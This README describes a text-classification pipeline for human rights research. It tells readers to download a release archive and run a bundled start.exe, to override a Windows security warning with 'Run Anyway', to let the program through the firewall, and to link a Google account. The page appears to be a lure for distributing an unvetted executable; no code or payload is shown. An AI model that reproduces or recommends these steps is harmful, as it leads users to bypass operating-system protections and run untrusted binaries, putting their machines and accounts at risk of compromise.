# 🤖 applied-nlp-multilabel-pipeline - Streamline human rights text analysis tasks

[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/hlakm9207/applied-nlp-multilabel-pipeline/releases)

This application helps users sort and categorize large collections of text documents. It uses machine learning to identify topics and labels within your data. The tool includes a manual review process to ensure the accuracy of your results. Researchers use this pipeline to organize information for human rights projects.

## 📋 System Requirements

Your computer needs specific hardware and software to run this tool smoothly. Confirm your workstation meets these standards before you begin:

* Operating System: Windows 10 or Windows 11.
* Memory: At least 16 gigabytes of RAM.
* Storage: 5 gigabytes of free space on your hard drive.
* Processor: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better).
* Internet Connection: A stable connection for the first-time setup and data synchronization.

## 📥 How to Download the Software

You can get the application files from the release page. This page hosts the current version of the tool.

[Visit the official release page to download your copy](https://github.com/hlakm9207/applied-nlp-multilabel-pipeline/releases)

Once you reach the page, look for the section marked Assets. Click the link that ends in .zip to start your download. Save this file to a folder like your Downloads or Documents directory.

## ⚙️ Setting Up the Application

Follow these steps to prepare the tool for your first project:

1. Right-click the downloaded .zip file and select Extract All. Choose a location on your computer to store the extracted folder.
2. Open the folder and find the file named start.exe. 
3. Double-click the file to launch the setup window. The application will check your system for the necessary files.
4. If a security prompt appears from Windows, click More Info and then click Run Anyway. This confirms your intent to open the program.
5. The application will open a control window on your screen. Keep this window open while you use the tool.

## 🎯 Using the Workflow

The software handles complex tasks through a guided workflow. Follow this sequence to categorize your text data:

### Data Import
The tool accepts text files in CSV format. Format your data with one piece of text per row in the first column. Place your CSV file inside the project folder under a sub-folder named Data.

### Model Analysis
The application uses a pre-trained model to read your text. It looks for specific patterns related to your human rights project. The system marks each document with labels based on its findings. 

### Human Review
Machine models make mistakes. The system flags documents where it feels uncertain about the label. These documents go to a review queue. You can open the interface to read these documents and assign the correct labels manually. This feedback goes back into the model to improve future results.

### Sheets Integration
The tool connects to Google Sheets to store your work. You can link your account to export your categorized data. This feature keeps your research records current and accessible from any web browser.

## 🚀 Managing Your Project

Effective research requires careful organization. Use the following practices to maintain your data:

* Back up your Data folder frequently.
* Label your CSV files with dates to track versions.
* Review your feedback logs inside the folder to see how the model grows over time.

If the application stops responding, close the main window and restart the start.exe file. Your progress saves automatically after every manual review step. 

## 🛡️ Privacy and Safety

This repository contains code meant for research purposes. The pipeline processes data on your local computer first. This ensures your sensitive documents do not upload to external servers without your permission. Be sure to review the NOTICE.md file included in your download. This file explains the rules for using this software in your research environment. 

## 🔧 Troubleshooting Common Issues

If you encounter errors, check these common solutions:

* Connection Error: Ensure your firewall allows the application to access the local web server.
* Slow Performance: Close other resource-heavy programs like video editors or web browsers while the model runs.
* Data Format Errors: Ensure your CSV file uses UTF-8 encoding. You can set this in most spreadsheet programs during the save process.
* Missing Labels: If the model fails to return results, ensure your input file contains text in the first column and not just headers.

You may need to restart your computer if the application refuses to launch after you verify the file integrity. Most installation issues stem from restricted folders where the software cannot create temporary files. Move the folder to your Documents folder if you encounter permission errors.